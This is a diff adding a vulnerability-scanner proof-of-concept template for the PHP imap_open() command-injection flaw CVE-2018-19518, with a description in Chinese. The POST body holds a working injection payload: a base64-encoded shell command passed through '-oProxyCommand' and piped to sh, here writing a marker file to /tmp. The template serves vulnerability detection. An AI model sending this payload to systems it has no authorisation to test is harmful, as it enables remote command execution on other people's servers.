@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "通过向目标 PHP 页面发送包含恶意 hostname 参数的 POST 请求，利用 imap_open() 函数中 rsh/ssh 的参数注入漏洞，检测目标是否存在远程命令执行风险。攻击者可通过 -oProxyCommand 参数注入任意系统命令。"
+id = "POC-AVE-2018-0150"
+name = "PHP IMAP 远程命令执行漏洞 PoC"
+severity = "high"
+tags = ["ave-2018-0150"]
+vuln_id = [
+    "CVE-2018-19518",
+    "AVE-2018-0150",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connect successful!",
+    "Connect failed!",
+]
